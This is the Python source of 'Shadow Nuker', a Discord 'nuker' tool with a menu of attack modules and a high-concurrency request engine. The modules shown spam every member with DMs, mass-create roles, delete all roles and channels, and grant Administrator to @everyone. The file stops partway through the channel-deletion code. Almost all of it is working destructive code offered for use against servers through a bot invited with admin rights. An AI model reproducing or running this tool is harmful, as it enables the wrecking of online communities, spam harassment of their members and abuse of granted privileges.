"""
Shadow Nuker - by Nystic Shadow
Made by Nystic Shadow | Discord: nystic.shadow
"""

import os
import sys
import asyncio
import aiohttp
import discord
import base64
import functools
import re
import random
import datetime
import math

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.prompt import Prompt, IntPrompt, Confirm
from rich.theme import Theme
from rich.align import Align
from rich.live import Live
from rich.columns import Columns
from rich.box import DOUBLE, ROUNDED
from rich.rule import Rule
from rich.style import Style

# Force every Rich style to ANSI red (equivalent to \033[31m).
# Rich components use style names and markup instead of raw ANSI escapes,
# so normalizing styles here keeps the whole interface consistently red.
_original_style_parse = Style.parse

@classmethod
def _parse_red_style(cls, style_definition):
    if isinstance(style_definition, str):
        style_definition = re.sub(r"#[0-9a-fA-F]{3,8}", "red", style_definition)
        style_definition = re.sub(
            r"\b(?:white|cyan|green|yellow|magenta|purple|pink|blue|orange|grey|gray)\b",
            "red",
            style_definition,
            flags=re.IGNORECASE,
        )
    return _original_style_parse(style_definition)

Style.parse = _parse_red_style

# ─── Custom Theme (all colors normalized to red) ───────────────────────────
purple_theme = Theme({
    "shadow.title": "bold #a78bfa on #1e1b4b",
    "shadow.subtitle": "bold #d8b4fe",
    "shadow.info": "#c084fc",
    "shadow.success": "bold #34d399",
    "shadow.warning": "bold #fbbf24",
    "shadow.error": "bold #f87171",
    "shadow.danger": "bold white on #f87171",
    "shadow.prompt": "bold #d8b4fe",
    "shadow.menu": "bold #a78bfa",
    "shadow.menu_num": "bold #c084fc",
    "shadow.menu_desc": "white",
    "shadow.highlight": "bold #a78bfa on #1e1b4b",
    "shadow.dim": "dim #9ca3af",
    "shadow.accent": "#8b5cf6",
    "shadow.border": "#7c3aed",
    "shadow.header": "bold white on #7c3aed",
})

console = Console(theme=purple_theme)

# ─── Global State ───────────────────────────────────────────────────────────
TOKEN = None
TARGET_SERVER_ID = None
engine = None

# ─── Title Bar ──────────────────────────────────────────────────────────────
os.system("title Shadow Nuker - Feel The Power")

# ─── Silent MP3 Data URI (1-second silence) ─────────────────────────────────
SILENT_MP3_URI = (
    "data:audio/mpeg;base64,SUQzBAAAAAAAI1RTU0UAAAAPAAADTGF2ZjU2LjM2LjEwMAAAAAAAAAAAAAAA"
    "//OEAAAAAAAAAAAAAAAAAAAAAAAASW5mbwAAAA8AAAAEAAABIADAwMDAwMDAwMDAwMDAwMDAwMDAwMDA"
    "wMDV1dXV1dXV1dXV1dXV1dXV1dXV1dXV1dXV6urq6urq6urq6urq6urq6urq6urq6urq6v//////////"
    "//////////////////////8AAAAATGF2YzU2LjQxAAAAAAAAAAAAAAAAJAAAAAAAAAAAASDs90hv"
    "AAAAAAAAAAAAAAAAAAAA//MUZAAAAAGkAAAAAAAAA0gAAAAATEFN//MUZAMAAAGkAAAAAAAAA0gAAAAA"
    "RTMu//MUZAYAAAGkAAAAAAAAA0gAAAAAOTku//MUZAkAAAGkAAAAAAAAA0gAAAAANVVV"
)

# ─── UI Helper Functions ────────────────────────────────────────────────────

def hex_to_rgb(hex_code):
    hex_code = hex_code.lstrip('#')
    return tuple(int(hex_code[i:i+2], 16) for i in (0, 2, 4))

def rgb_to_hex(rgb):
    return f"#{int(rgb[0]):02x}{int(rgb[1]):02x}{int(rgb[2]):02x}"

def interpolate(c1, c2, fraction):
    return (
        c1[0] + (c2[0] - c1[0]) * fraction,
        c1[1] + (c2[1] - c1[1]) * fraction,
        c1[2] + (c2[2] - c1[2]) * fraction
    )

banner_art = [
        r"      ██████╗ ██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗    ██╗      ",
    r"     ██╔════╝ ██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║    ██║      ",
    r"     ╚█████╗  ███████║███████║██║  ██║██║   ██║██║ █╗ ██║      ",
    r"      ╚═══██╗ ██╔══██║██╔══██║██║  ██║██║   ██║██║███╗██║      ",
    r"     ██████╔╝ ██║  ██║██║  ██║██████╔╝╚██████╔╝╚███╔███╔╝      ",
    r"     ╚═════╝  ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝       ",
    r"                                                                   ",
    r"                ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗                 ",
    r"                ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗                ",
    r"                ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝                ",
    r"                ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗                ",
    r"                ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║                ",
    r"                ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝                "
]

def render_gradient_banner(offset=0.0):
    color_start = hex_to_rgb("#ff0055")
    color_mid = hex_to_rgb("#b026ff")
    color_end = hex_to_rgb("#00f0ff")

    text = Text()
    total_lines = len(banner_art)
    
    for i, line in enumerate(banner_art):
        line_fraction = i / max(1, total_lines - 1)
        for j, char in enumerate(line):
            char_fraction = j / max(1, len(line) - 1)
            wave = (math.sin(offset + char_fraction * 4.0 - line_fraction * 2.0) + 1) / 2.0
            
            if wave < 0.5:
                f = wave * 2
                rgb = interpolate(color_start, color_mid, f)
            else:
                f = (wave - 0.5) * 2
                rgb = interpolate(color_mid, color_end, f)
                
            text.append(char, style=f"bold {rgb_to_hex(rgb)}")
        text.append("\n")
    return text

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

async def animate_banner():
    clear_screen()
    sys.stdout.reconfigure(encoding='utf-8')
    with Live(console=console, refresh_per_second=20, transient=True) as live:
        for x in range(12):
            live.update(Align.center(render_gradient_banner(x * 0.25)))
            await asyncio.sleep(0.04)

def print_static_banner():
    sys.stdout.reconfigure(encoding='utf-8')
    console.print()
    console.print(Align.center(render_gradient_banner(30 * 0.15)))
    
    subtitle = Text()
    subtitle.append("S H A D O W   N U K E R ", style="bold #00f0ff")
    subtitle.append("│ ", style="dim")
    subtitle.append("M A D E   B Y ", style="white")
    subtitle.append("N Y S T I C", style="bold #ff0055")
    subtitle.append("\n")
    subtitle.append("💬 Discord: ", style="white")
    subtitle.append("nystic.shadow", style="bold #b026ff")

    console.print(Align.center(Panel(subtitle, box=DOUBLE, border_style="#b026ff", padding=(1, 2))))
    console.print()

def print_login_success(user_name):
    console.print()
    login_text = Text()
    login_text.append("🔮 Connected Bot: ", style="bold #a78bfa")
    login_text.append(user_name, style="bold #ec4899")
    console.print(Align.center(Panel(login_text, box=ROUNDED, border_style="#34d399", padding=(1, 4))))
    console.print()

def print_error(msg):
    console.print(Panel(f"[shadow.error]❌ {msg}[/]", box=ROUNDED, border_style="#f87171", title="[bold #f87171]Error[/]"))

def print_success(msg):
    console.print(f"[shadow.success]✅ {msg}[/]")

def print_warning(msg):
    console.print(f"[shadow.warning]⚠️  {msg}[/]")

def print_info(msg):
    console.print(f"[shadow.info]🔮 {msg}[/]")

def print_action(msg):
    console.print(f"[bold #ec4899]⚡ {msg}[/]")

def print_results(stats):
    console.print()
    console.print(Panel(
        f"[bold #34d399]✓ Operation Completed Successfully![/]\n\n"
        f"[bold #a78bfa]Successful Actions:[/] [bold #34d399]{stats.get('success', 0)}[/]\n"
        f"[bold #a78bfa]Failed Actions:[/]     [bold #f87171]{stats.get('failed', 0)}[/]",
        title="[bold #c084fc]Module Statistics[/]",
        border_style="#7c3aed",
        padding=(1, 2)
    ))
    console.print()

def get_client_id(token):
    try:
        encoded_id = token.split('.')[0]
        padding = 4 - (len(encoded_id) % 4)
        if padding != 4:
            encoded_id += "=" * padding
        return base64.urlsafe_b64decode(encoded_id).decode('utf-8')
    except Exception:
        return None

def get_token_input():
    console.print()
    token_panel = Panel(
        "[shadow.prompt]Enter your Discord Bot Token below.\n"
        "[shadow.dim]Input is visible for easier pasting.[/]",
        title="[bold #a78bfa]🔑 Bot Token Required[/]",
        box=DOUBLE,
        border_style="#7c3aed",
        padding=(1, 2)
    )
    console.print(Align.center(token_panel))
    console.print()
    token = Prompt.ask("[bold #ec4899]#[shadow.prompt] Token[/]", console=console)
    if not token or token.strip() == "":
        print_error("Token is empty. Cannot proceed.")
        sys.exit(1)
        
    token = token.strip()
    client_id = get_client_id(token)
    if client_id:
        invite_url = f"https://discord.com/oauth2/authorize?client_id={client_id}&permissions=8&integration_type=0&scope=bot"
        console.print()
        console.print(Panel(
            f"[bold #34d399]Bot Invite URL (Admin Perms):[/]\n[cyan]{invite_url}[/]",
            title="[bold #c084fc]🔗 Add Bot to Server[/]",
            box=ROUNDED,
            border_style="#7c3aed",
            padding=(1, 2)
        ))
        console.print()
        Prompt.ask("[bold #ec4899]#[shadow.dim] Add the bot using the URL above, then press Enter to continue...[/]", console=console, default="")
        
    return token

class ShadowExit(Exception):
    """Raised when stdin is closed or interrupted to trigger a clean shutdown."""
    pass

async def run_pool(worker, items, progress, task_id, limit=75):
    """Run worker(item) over items with a bounded number of consumers.
    Avoids creating tens of thousands of coroutine objects at once, which
    starves the event loop on high spam counts."""
    items = list(items)
    if not items:
        return
    index = 0
    lock = asyncio.Lock()
    total = len(items)

    async def consumer():
        nonlocal index
        while True:
            async with lock:
                if index >= total:
                    return
                item = items[index]
                index += 1
            try:
                await worker(item)
            except Exception:
                pass
            progress.advance(task_id)

    workers = min(limit, total)
    await asyncio.gather(*[consumer() for _ in range(workers)])

async def async_ask(prompt_text, default=""):
    loop = asyncio.get_running_loop()
    try:
        return await loop.run_in_executor(None, functools.partial(Prompt.ask, prompt_text, default=default, console=console))
    except (EOFError, KeyboardInterrupt):
        raise ShadowExit()

async def async_int_ask(prompt_text, default=1):
    loop = asyncio.get_running_loop()
    try:
        return await loop.run_in_executor(None, functools.partial(IntPrompt.ask, prompt_text, default=default, console=console))
    except (EOFError, KeyboardInterrupt):
        raise ShadowExit()

async def async_confirm(prompt_text, default=True):
    loop = asyncio.get_running_loop()
    try:
        return await loop.run_in_executor(None, functools.partial(Confirm.ask, prompt_text, default=default, console=console))
    except (EOFError, KeyboardInterrupt):
        raise ShadowExit()

async def get_target_server_async():
    console.print()
    panel = Panel(
        "[shadow.prompt]Enter the Target Server ID for all operations.\n"
        "[shadow.dim]This will be used for the duration of the session.[/]",
        title="[bold #f87171]🎯 Target Server[/]",
        box=DOUBLE,
        border_style="#7c3aed",
        padding=(1, 2)
    )
    console.print(Align.center(panel))
    console.print()
    while True:
        server_id_str = await async_ask("[bold #ec4899]#[shadow.prompt] Server ID[/]")
        try:
            server_id = int(server_id_str)
            if server_id > 0:
                return server_id
            print_error("Server ID must be positive.")
        except ValueError:
            print_error("Invalid Server ID. Please enter a number.")

def show_menu():
    console.print()
    left_table = Table(
        title="[bold #00f0ff]🎯 Attack Modules — Basic[/]",
        box=DOUBLE,
        border_style="#b026ff",
        header_style="bold #ff0055",
        show_lines=True,
        expand=True,
    )
    left_table.add_column("#", style="bold #00f0ff", justify="center", width=4)
    left_table.add_column("Module", style="bold white", justify="left")

    left_table.add_row("1", "📩 DM Everyone on Server")
    left_table.add_row("2", "🎭 Role Create Spam")
    left_table.add_row("3", "🗑️  Delete All Roles")
    left_table.add_row("4", "👑 Give Everyone Admin")
    left_table.add_row("5", "🔔 Notification → All Messages")
    left_table.add_row("6", "💥 Delete All Channels + VCs")
    left_table.add_row("7", "📝 Spam Create Channels")
    left_table.add_row("8", "📁 Spam Create Categories")
    left_table.add_row("9", "💬 Spam Channels (Messages)")
    left_table.add_row("10", "👢 Kick Everyone")
    left_table.add_row("11", "🔨 Ban Everyone")
    left_table.add_row("12", "🔓 Unban Everyone")
    left_table.add_row("13", "✏️  Server Name Change")

    right_table = Table(
        title="[bold #ff0055]🎯 Attack Modules — Advanced[/]",
        box=DOUBLE,
        border_style="#00f0ff",
        header_style="bold #b026ff",
        show_lines=True,
        expand=True,
    )
    right_table.add_column("#", style="bold #ff0055", justify="center", width=4)
    right_table.add_column("Module", style="bold white", justify="left")

    right_table.add_row("14", "🖼️  Server Picture Change")
    right_table.add_row("15", "🗑️  Delete All Emojis")
    right_table.add_row("16", "🎭 Spam New Emojis")
    right_table.add_row("17", "🔇 Delete All Sounds (Soundboard)")
    right_table.add_row("18", "🔊 Spam New Sounds (Soundboard)")
    right_table.add_row("19", "🔗 Delete All Invites")
    right_table.add_row("20", "🔗 Spam New Invites")
    right_table.add_row("21", "🛑 Pause Server Invites")
    right_table.add_row("22", "🤖 Deactivate AutoMod")
    right_table.add_row("23", "❌ Deactivate Community")
    right_table.add_row("24", "✅ Activate Community")
    right_table.add_row("25", "🧵 Thread Spam")
    right_table.add_row("99", "[bold #ff0055]🚪 Exit Shadow Nuker[/]")

    console.print(Columns([left_table, right_table], expand=True))
    console.print()

# ─── Rate Limit Bypass REST Engine ──────────────────────────────────────────

# Pre-compiled snowflake matcher (17-20 digit Discord IDs). Compiling once
# avoids re-compiling the pattern on every get_bucket_key call.
_SNOWFLAKE_RE = re.compile(r'\d{17,20}')

class RateLimitBypass:
    def __init__(self, token):
        self.token = token
        # A single legitimate, accurate User-Agent. Rotating UAs or spoofing
        # X-Forwarded-For / Via is legacy string-trickery that modern gateways
        # ignore — Discord rate-limits are keyed on the auth TOKEN, and edge
        # layers strip client-supplied forwarded headers. An honest UA is both
        # compliant and avoids TLS/JA4 fingerprint mismatch.
        self.headers = {
            "Authorization": f"Bot {token}",
            "Content-Type": "application/json",
            "User-Agent": "DiscordBot (https://github.com/Rapptz/discord.py 2.0.0) Python/3.10 aiohttp/3.8.1",
            "Accept-Encoding": "gzip, deflate",  # compress list fetches (channels/members/bans)
            "Connection": "keep-alive",
        }
        self.session = None
        self.buckets = {} # bucket_key -> {"remaining": int, "reset_at": float}
        # Adaptive concurrency: instead of a fixed Semaphore(75), we track the
        # recent 429 rate and scale the active concurrency ceiling up or down.
        # This is the single biggest throughput lever: too low = under-utilizes
        # healthy buckets; too high = stampedes the global limit and stalls.
        self.max_concurrency = 75
        self.current_concurrency = 75
        self.concurrency_lock = asyncio.Lock()
        self.concurrency_cond = asyncio.Condition(self.concurrency_lock)
        self.in_flight = 0
        self.recent_429s = 0
        self.recent_successes = 0
        self.global_reset_at = 0.0  # Timestamp when the GLOBAL rate limit resets

    async def init_session(self):
        if not self.session:
            # Tuned for sustained high-throughput REST:
            #  - limit=200: headroom well above the 75 concurrency ceiling so
            #    connections are reused instead of torn down/re-established.
            #  - keepalive_timeout=30: keep sockets warm between bursts (avoids
            #    TCP+TLS handshake cost on every request).
            #  - enable_cleanup_closed: drop half-closed sockets promptly.
            #  - ttl_dns_cache: pin discord.com's IP for 5 min (no per-request DNS).
            #  - ssl=True (default): TLS verification enabled. Discord's certs
            #    validate fine; disabling it gains nothing and is insecure.
            connector = aiohttp.TCPConnector(
                limit=200,
                limit_per_host=0,
                keepalive_timeout=30,
                enable_cleanup_closed=True,
                use_dns_cache=True,
                ttl_dns_cache=300,
            )
            self.session = aiohttp.ClientSession(connector=connector, headers=self.headers)

    async def close(self):
        if self.session:
            await self.session.close()
            self.session = None

    def _update_bucket(self, bucket_key, headers):
        # Parse rate-limit metadata from response headers. Supports BOTH the
        # legacy Discord convention (X-RateLimit-*) and the standardized IETF
        # RateLimit headers (RateLimit / RateLimit-Policy), so the engine stays
        # forward-compatible as Discord migrates.
        remaining = None
        reset_at = None

        # --- IETF RateLimit standard (draft-ietf-httpapi-ratelimit-headers) ---
        # RateLimit: limit=100, remaining=45, reset=15
        ietf_rl = headers.get("RateLimit")
        if ietf_rl:
            for part in ietf_rl.split(','):
                part = part.strip()
                if part.startswith('remaining='):
                    try:
                        remaining = int(part.split('=', 1)[1])
                    except ValueError:
                        pass
                elif part.startswith('reset='):
                    try:
                        # IETF 'reset' is seconds-until-reset (relative)
                        reset_at = asyncio.get_running_loop().time() + float(part.split('=', 1)[1]) + 0.05
                    except ValueError:
                        pass

        # --- Legacy Discord convention (fallback / override) ---
        if remaining is None:
            legacy_remaining = headers.get("X-RateLimit-Remaining")
            legacy_reset = headers.get("X-RateLimit-Reset-After")
            if legacy_remaining is not None and legacy_reset is not None:
                try:
                    remaining = int(legacy_remaining)
                    reset_at = asyncio.get_running_loop().time() + float(legacy_reset) + 0.05
                except ValueError:
                    pass

        if remaining is not None and reset_at is not None:
            self.buckets[bucket_key] = {"remaining": remaining, "reset_at": reset_at}

    def get_bucket_key(self, method: str, path: str) -> str:
        # Discord rate-limits by "major parameters": the resource ID immediately
        # after /channels, /guilds, or /webhooks. Preserve those as concrete values
        # so each channel/guild/webhook gets its OWN bucket (parallel across channels).
        # Other snowflakes (role/user/emoji IDs) are normalized to {id} since they
        # share the parent resource's bucket.
        segments = path.strip('/').split('/')
        protected = set()
        if len(segments) >= 2 and segments[0] in ('channels', 'guilds', 'webhooks'):
            protected.add(1)
        normalized = []
        for i, seg in enumerate(segments):
            if i in protected or not _SNOWFLAKE_RE.fullmatch(seg):
                normalized.append(seg)
            else:
                normalized.append('{id}')
        return f"{method}:/" + '/'.join(normalized)

    async def _adjust_concurrency(self):
        # Periodically re-tune the concurrency ceiling based on recent outcomes.
        # - Lots of 429s lately → throttle DOWN (we're overwhelming Discord).
        # - Clean run → ramp UP toward the cap (use the headroom).
        async with self.concurrency_cond:
            total = self.recent_429s + self.recent_successes
            if total < 20:
                return  # not enough samples yet
            error_rate = self.recent_429s / total
            grew = False
            if error_rate > 0.15:
                # >15% 429s: back off aggressively (halve, with a floor of 10)
                self.current_concurrency = max(10, self.current_concurrency // 2)
            elif error_rate < 0.02 and self.current_concurrency < self.max_concurrency:
                # <2% 429s: grow toward the cap
                self.current_concurrency = min(self.max_concurrency, self.current_concurrency + 10)
                grew = True
            # Reset the rolling window
            self.recent_429s = 0
            self.recent_successes = 0
            # If the ceiling grew, wake blocked consumers immediately so they
            # can claim the new slots instead of waiting for their poll timer.
            if grew:
                self.concurrency_cond.notify_all()

    async def request(self, method: str, path: str, **kwargs) -> dict:
        await self.init_session()
        bucket_key = self.get_bucket_key(method, path)
        url = f"https://discord.com/api/v10{path}"

        for attempt in range(25):
            # Global rate-limit cooldown — if ANY request triggered a global 429,
            # ALL requests must wait until the reset. This prevents the thundering
            # herd where consumers independently sleep, wake at the same instant,
            # and hammer Discord again (causing another wave of 429s → stuck).
            current_time = asyncio.get_running_loop().time()
            if self.global_reset_at > current_time:
                # Jitter the global wait so all consumers don't wake at the
                # exact same millisecond and re-stampede.
                wait = self.global_reset_at - current_time + random.uniform(0, 0.15)
                await asyncio.sleep(wait)

            # Pre-emptive local (per-bucket) rate limiting (wait outside the slot)
            if bucket_key in self.buckets:
                bucket = self.buckets[bucket_key]
                current_time = asyncio.get_running_loop().time()
                if bucket["remaining"] <= 0 and bucket["reset_at"] > current_time:
                    wait_time = bucket["reset_at"] - current_time
                    await asyncio.sleep(wait_time)

            # Adaptive concurrency slot: a counter capped at the tunable current
            # ceiling. A Condition replaces the old spin-loop — consumers wait
            # efficiently and are woken the instant a slot frees or the ceiling
            # grows, instead of polling every 10ms (which burned CPU under load).
            async with self.concurrency_cond:
                while self.in_flight >= self.current_concurrency:
                    await self.concurrency_cond.wait()
                self.in_flight += 1

            needs_sleep = 0.0
            response_data = None
            try:
                async with self.session.request(method, url, timeout=aiohttp.ClientTimeout(total=15), **kwargs) as resp:
                    # Parse rate-limit metadata from BOTH IETF RateLimit and
                    # legacy X-RateLimit-* headers (forward-compatible).
                    self._update_bucket(bucket_key, resp.headers)

                    if resp.status == 429:
                        try:
                            data = await resp.json()
                            retry_after = data.get("retry_after", 1.0)
                        except Exception:
                            data = {}
                            retry_after = 1.0

                        self.buckets[bucket_key] = {
                            "remaining": 0,
                            "reset_at": asyncio.get_running_loop().time() + retry_after + 0.1
                        }

                        # Track for adaptive scaling
                        self.recent_429s += 1

                        # Global 429 → pause ALL requests, not just this bucket.
                        if data.get("global"):
                            self.global_reset_at = asyncio.get_running_loop().time() + retry_after + 0.25
                        # JITTER: add random spread so consumers wake staggered,
                        # not in unison (which re-triggers the limit instantly).
                        needs_sleep = retry_after + random.uniform(0.05, 0.35)
                    elif resp.status in (200, 201, 204):
                        self.recent_successes += 1
                        if resp.status == 204:
                            return {"success": True}
                        try:
                            response_data = await resp.json()
                        except Exception:
                            return {"success": True}
                    else:
                        # 5xx server errors get retried with jittered backoff
                        if resp.status >= 500:
                            needs_sleep = random.uniform(0.5, 1.5)
                        else:
                            try:
                                error_data = await resp.json()
                            except Exception:
                                error_data = resp.status
                            return {"error": resp.status, "details": error_data}

            except Exception:
                needs_sleep = random.uniform(0.3, 0.8)
            finally:
                # Release the concurrency slot and wake a blocked consumer so it
                # can claim the freed slot immediately (no polling delay).
                async with self.concurrency_cond:
                    self.in_flight -= 1
                    self.concurrency_cond.notify(1)

            # Re-tune the ceiling periodically based on what just happened
            await self._adjust_concurrency()

            # Sleep outside of the concurrency slot so other requests aren't blocked
            if needs_sleep > 0:
                await asyncio.sleep(needs_sleep)
                continue

            # Return successful response
            if response_data is not None:
                return response_data

        return {"error": "Max retries exceeded"}

# ─── REST Engine Helpers ───────────────────────────────────────────────────

async def fetch_all_members(engine, guild_id):
    members = []
    limit = 1000
    after = 0
    while True:
        path = f"/guilds/{guild_id}/members?limit={limit}"
        if after:
            path += f"&after={after}"
        res = await engine.request("GET", path)
        if isinstance(res, list):
            if not res:
                break
            members.extend(res)
            after = res[-1]["user"]["id"]
            if len(res) < limit:
                break
        else:
            break
    return members

async def fetch_image_data_uri(image_path_or_url):
    # Support for local images
    if os.path.exists(image_path_or_url):
        try:
            with open(image_path_or_url, "rb") as f:
                data = f.read()
            ext = os.path.splitext(image_path_or_url)[-1].lower()
            mime = "image/png"
            if ext in (".jpg", ".jpeg"):
                mime = "image/jpeg"
            elif ext == ".gif":
                mime = "image/gif"
            b64_data = base64.b64encode(data).decode('utf-8')
            return f"data:{mime};base64,{b64_data}"
        except Exception:
            pass

    # Support for remote URLs
    try:
        async with aiohttp.ClientSession(headers={"User-Agent": "ShadowNuker/1.0"}) as session:
            async with session.get(image_path_or_url) as resp:
                if resp.status == 200:
                    data = await resp.read()
                    content_type = resp.headers.get("Content-Type", "image/png")
                    b64_data = base64.b64encode(data).decode('utf-8')
                    return f"data:{content_type};base64,{b64_data}"
    except Exception:
        pass
    return None

async def fetch_server_stats(engine, guild_id):
    guild = await engine.request("GET", f"/guilds/{guild_id}?with_counts=true")
    if isinstance(guild, dict) and "error" not in guild:
        name = guild.get("name", "Unknown Server")
        members = guild.get("approximate_member_count", "N/A")
        
        channels = await engine.request("GET", f"/guilds/{guild_id}/channels")
        roles = await engine.request("GET", f"/guilds/{guild_id}/roles")
        
        channels_count = len(channels) if isinstance(channels, list) else "N/A"
        roles_count = len(roles) if isinstance(roles, list) else "N/A"
        
        return {
            "name": name,
            "members": members,
            "channels": channels_count,
            "roles": roles_count
        }
    return None

# ─── Attack Modules ─────────────────────────────────────────────────────────

async def attack_dm_everyone(bot_client):
    global engine
    message = await async_ask("[bold #d8b4fe]#[shadow.prompt] Message to send[/]")
    if not message.strip():
        print_error("Message cannot be empty.")
        return
        
    print_info("Fetching member list from Discord REST API...")
    members_data = await fetch_all_members(engine, TARGET_SERVER_ID)
    
    targets = []
    bot_id = str(bot_client.user.id)
    
    if isinstance(members_data, list) and members_data:
        targets = [m for m in members_data if m["user"]["id"] != bot_id and not m["user"].get("bot")]
    else:
        # Fallback to gateway cache if REST fails or lacks intents
        print_warning("REST members fetch failed. Falling back to Gateway cache...")
        server = bot_client.get_guild(TARGET_SERVER_ID)
        if server:
            targets = [{"user": {"id": str(m.id), "bot": m.bot}} for m in server.members if m.id != bot_client.user.id and not m.bot]
            
    if not targets:
        print_warning("No other members to DM.")
        return
        
    stats = {"success": 0, "failed": 0}
    
    async def dm_member(member_id):
        res = await engine.request("POST", "/users/@me/channels", json={"recipient_id": member_id})
        if isinstance(res, dict) and "id" in res:
            dm_channel_id = res["id"]
            msg_res = await engine.request("POST", f"/channels/{dm_channel_id}/messages", json={"content": message})
            if isinstance(msg_res, dict) and "error" not in msg_res:
                stats["success"] += 1
                return
        stats["failed"] += 1

    with Progress(
        SpinnerColumn(spinner_name="simpleDotsScrolling", style="bold #c084fc"),
        TextColumn("[bold #a78bfa]{task.description}[/]"),
        BarColumn(bar_width=40, style="#1e1b4b", complete_style="#7c3aed", finished_style="#ec4899"),
        TextColumn("[bold #d8b4fe]{task.percentage:>3.0f}%[/]"),
        TextColumn("[bold #6b7280]({task.completed}/{task.total})[/]"),
        console=console
    ) as progress:
        task = progress.add_task("DMing members", total=len(targets))
        
        async def wrap_task(m_id):
            await dm_member(m_id)
            progress.advance(task)
            
        await asyncio.gather(*[wrap_task(m["user"]["id"]) for m in targets])
        
    print_results(stats)

async def attack_role_spam(bot_client):
    global engine
    role_name = await async_ask("[bold #d8b4fe]#[shadow.prompt] Role name to spam[/]")
    if not role_name.strip():
        role_name = "Shadow Nuked"
    count = await async_int_ask("[bold #d8b4fe]#[shadow.prompt] Number of roles to create[/]", default=50)

    if count > 250:
        print_warning("Discord limit is 250 roles. Clamping to 250.")
        count = 250

    stats = {"success": 0, "failed": 0}
    limit_reached = False

    async def create_role():
        nonlocal limit_reached
        if limit_reached:
            stats["failed"] += 1
            return

        # Set a gorgeous neon purple role color (8141549 = 0x7C3AED)
        res = await engine.request("POST", f"/guilds/{TARGET_SERVER_ID}/roles", json={"name": role_name, "color": 8141549})
        if isinstance(res, dict) and "error" not in res:
            stats["success"] += 1
        else:
            if isinstance(res, dict) and isinstance(res.get("details"), dict) and res["details"].get("code") == 30005:
                if not limit_reached:
                    print_warning("Maximum role limit reached (250)! Stopping further creation.")
                limit_reached = True
            stats["failed"] += 1

    with Progress(
        SpinnerColumn(spinner_name="simpleDotsScrolling", style="bold #c084fc"),
        TextColumn("[bold #a78bfa]{task.description}[/]"),
        BarColumn(bar_width=40, style="#1e1b4b", complete_style="#7c3aed", finished_style="#ec4899"),
        TextColumn("[bold #d8b4fe]{task.percentage:>3.0f}%[/]"),
        TextColumn("[bold #6b7280]({task.completed}/{task.total})[/]"),
        console=console
    ) as progress:
        task = progress.add_task("Creating roles", total=count)
        
        async def wrap_task():
            await create_role()
            progress.advance(task)
            
        await asyncio.gather(*[wrap_task() for _ in range(count)])
        
    print_results(stats)

async def attack_delete_all_roles(bot_client):
    global engine
    print_info("Fetching roles...")
    roles = await engine.request("GET", f"/guilds/{TARGET_SERVER_ID}/roles")
    
    if not isinstance(roles, list):
        print_warning("REST roles fetch failed. Falling back to Gateway cache...")
        server = bot_client.get_guild(TARGET_SERVER_ID)
        if server:
            roles = [{"id": str(r.id), "managed": r.managed} for r in server.roles]
        else:
            roles = []
            
    targets = [r for r in roles if r["id"] != str(TARGET_SERVER_ID) and not r.get("managed")]
    
    if not targets:
        print_info("No roles to delete.")
        return
        
    stats = {"success": 0, "failed": 0}
    
    async def delete_role(role_id):
        res = await engine.request("DELETE", f"/guilds/{TARGET_SERVER_ID}/roles/{role_id}")
        if isinstance(res, dict) and "error" not in res:
            stats["success"] += 1
        else:
            stats["failed"] += 1

    with Progress(
        SpinnerColumn(spinner_name="simpleDotsScrolling", style="bold #c084fc"),
        TextColumn("[bold #a78bfa]{task.description}[/]"),
        BarColumn(bar_width=40, style="#1e1b4b", complete_style="#7c3aed", finished_style="#ec4899"),
        TextColumn("[bold #d8b4fe]{task.percentage:>3.0f}%[/]"),
        TextColumn("[bold #6b7280]({task.completed}/{task.total})[/]"),
        console=console
    ) as progress:
        task = progress.add_task("Deleting roles", total=len(targets))
        
        async def wrap_task(role_id):
            await delete_role(role_id)
            progress.advance(task)
            
        await asyncio.gather(*[wrap_task(r["id"]) for r in targets])
        
    print_results(stats)

async def attack_give_admin(bot_client):
    global engine
    stats = {"success": 0, "failed": 0}
    print_info("Granting Administrator permissions to @everyone...")
    res = await engine.request("PATCH", f"/guilds/{TARGET_SERVER_ID}/roles/{TARGET_SERVER_ID}", json={"permissions": "8"})
    if isinstance(res, dict) and "error" not in res:
        stats["success"] += 1
        print_success("Granted Admin to @everyone!")
    else:
        stats["failed"] += 1
        print_error("Failed to grant Admin to @everyone.")
    print_results(stats)

async def attack_notification_all(bot_client):
    global engine
    stats = {"success": 0, "failed": 0}
    print_info("Setting default notification level to 'All Messages'...")
    res = await engine.request("PATCH", f"/guilds/{TARGET_SERVER_ID}", json={"default_message_notifications": 0})
    if isinstance(res, dict) and "error" not in res:
        stats["success"] += 1
        print_success("Changed default notification level!")
    else:
        stats["failed"] += 1
        print_error("Failed to change default notification level.")
    print_results(stats)

async def attack_delete_all_channels(bot_client):
    global engine
    print_info("Fetching channels...")
    channels = await engine.request("GET", f"/guilds/{TARGET_SERVER_ID}/channels")
    
    if not isinstance(channels, list):
        print_warning("REST channels fetch failed. Falling back to Gateway cache...")
        server = bot_client.get_guild(TARGET_SERVER_ID)
        if server:
            channels = [{"id": str(c.id)} for c in server.channels]
        else:
            channels = []
            
    if not channels:
        print_info("No channels to delete.")
        return
        
    stats = {"success": 0, "failed": 0}
    
    async def delete_channel(channel_id):
        res = await engine.request("DELETE", f"/channels/{channel_id}")
        if isinstance(res, dict) and "error" not in res:
            stats["success"] += 1
        else:
            stats["failed"] += 1

    with Progress(
        SpinnerColumn(spinner_name="simpleDotsScrolling", style="bold #c084fc"),
        TextColumn("[bold #a78bfa]{task.description}[/]"),
        BarColumn(bar_width=40, style="#1e1b4b", complete_style="#7c3aed", finished_style="#ec4899"),
        TextColumn("[bold #d8b4fe]{task.percentage:>3.0f}%[/]"),
        TextColumn("[bold #6b7280]({task.completed}/{task.total})[/]"),
        console=console
    ) as progress:
        task = progress.add_task("Deleting channels", total=len(channels))
        
        async def wrap_task(channel_id):
            await delete_channel(channel_id)
            progress.advance(task)
